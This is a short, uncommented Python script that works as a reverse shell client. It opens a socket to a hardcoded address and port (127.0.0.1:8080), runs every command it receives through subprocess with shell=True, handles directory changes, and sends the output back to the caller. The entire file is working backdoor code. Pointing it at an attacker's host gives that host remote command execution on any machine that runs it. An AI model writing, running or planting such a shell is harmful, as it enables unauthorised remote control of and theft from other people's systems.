#Made by sug023
#!/bin/env python
import socket; import subprocess; import os

IP = "127.0.0.1"
PORT = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((IP, PORT))
while True:
    cmd = client.recv(1024); cmd = cmd.decode("utf-8")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True); output = result.stdout + result.stderr
    if cmd.startswith("cd "):
        try:
            path = cmd.strip().split(" ")[1]
            os.chdir(path)
            output = f"Moved to: {os.getcwd()}\n" 
        except Exception as e:
            output = str(e) + "\n"
    client.send(output.encode('utf-8'))
